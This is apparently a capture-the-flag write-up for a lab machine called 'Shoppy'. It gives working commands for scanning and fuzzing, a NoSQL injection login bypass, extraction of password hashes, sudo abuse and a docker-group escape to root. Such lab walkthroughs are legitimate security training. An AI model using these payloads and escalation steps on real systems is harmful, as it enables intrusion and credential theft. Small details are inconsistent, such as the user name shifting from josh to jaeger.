First enumerate the open ports then use nmap to scan its service

```bash
rustscan -a 10.129.227.233

result:
Open 10.129.227.233:22
Open 10.129.227.233:80
Open 10.129.227.233:9093

sudo nmap -sC -sV -p 22,80,9093 10.129.227.233

```

Add shoppy.htb to /etc/hosts

Nothing on the site, let’s enumerate subdirectories

```bash
gobuster dir -u http://shoppy.htb -w /usr/share/wordlists/dirb/common.txt

result:
/Admin                (Status: 302) [Size: 28] [--> /login]
/admin                (Status: 302) [Size: 28] [--> /login]
/ADMIN                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/exports              (Status: 301) [Size: 181] [--> /exports/]
/favicon.ico          (Status: 200) [Size: 213054]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/images               (Status: 301) [Size: 179] [--> /images/]
/js                   (Status: 301) [Size: 171] [--> /js/]
/login                (Status: 200) [Size: 1074]
/Login                (Status: 200) [Size: 1074]

```

Spotted the app to be run by nodejs which uses mongodb database which is vulnerable to nosql injection

```bash
In the login form:
username: admin' || '1' == '1

We get logged in
```

Now we get logged in there is a search user function. If the user exist then we get returned a export command which exports user and their hashes. We can use the same method as before to exploit the SQL injection vulnerability:

```bash
search: admin' || '1' == '1
Then click export and we get two users and their password hashes
```

Found user’s josh’s password through crackstation

We logged in as Josh and see nothing new, let’s try sshing. Does not work.

Let’s try enumerating for subdomains:

```bash
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://FUZZ.shoppy.htb -t 10

http://shoppy.htb/admin/

gobuster dir -u http://shoppy.htb/admin/ -w /usr/share/wordlists/dirb/common.txt

ffuf -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fw 5
```

For some reason the other ffuf command crashes wifi… 

Found subdomain mattermost. Login as user josh.

We check our sudo privleges

```bash
sudo -l

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
    
That means we can run the binary as the deploy user:

sudo -u deploy /home/deploy/password-manager
```

We find master password and the password manager gave us the credentials for user deploy. Now let’s login as user deploy

we get a shell. Let’s upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Running sudo results nothing. Running id tells us we are in the docker group

Let’s check what docker images there are:

```bash
docker image ls

result:
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
alpine       latest    d7d3d98c851f   2 years ago   5.53MB
```

Let’s  mount root inside the container:

```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt bash

And we get a root shell
```
